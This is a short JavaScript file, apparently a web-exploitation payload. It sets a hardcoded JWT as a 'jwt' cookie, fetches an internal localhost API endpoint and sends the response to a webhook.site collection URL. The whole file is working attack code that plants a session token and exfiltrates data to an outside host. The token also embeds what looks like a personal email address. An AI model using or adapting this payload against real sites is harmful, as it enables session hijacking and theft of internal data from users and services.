const sourceUrl = 'http://127.0.0.1:3314/api/generate';
function setCookie(name, value, daysToExpire) {
    let cookie = `${name}=${encodeURIComponent(value)}`;

    if (daysToExpire) {
      const expirationDate = new Date();
      expirationDate.setTime(expirationDate.getTime() + (daysToExpire * 24 * 60 * 60 * 1000));
      cookie += `;expires=${expirationDate.toUTCString()}`;
    }

    document.cookie = cookie;
  }

const cookieName = 'jwt';
const cookieValue = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjcwYzRhMTNjLWEyOWMtNDY4NS1iZjYxLTRhMWQyMmFkNTMzMCIsInJvbGUiOiJndWVzdCIsImVtYWlsIjoibmluamFnb2phZ29AZ21haWwuY29tIiwiYmFsYW5jZSI6NDAwLCJpYXQiOjE3ODQyNzA1OTl9.XzL08d77hNhz4s20gxZyJyRgZsJNnMeowZ_HutwO9yg';

setCookie(cookieName,cookieValue, 7)
fetch(sourceUrl)
  .then(response => {
    return response.text();
  })
  .then(data => {
    return fetch(`https://webhook.site/6813c3fc-ca54-4c0a-9cf1-ef3afe966825?response=${data}`);
  })
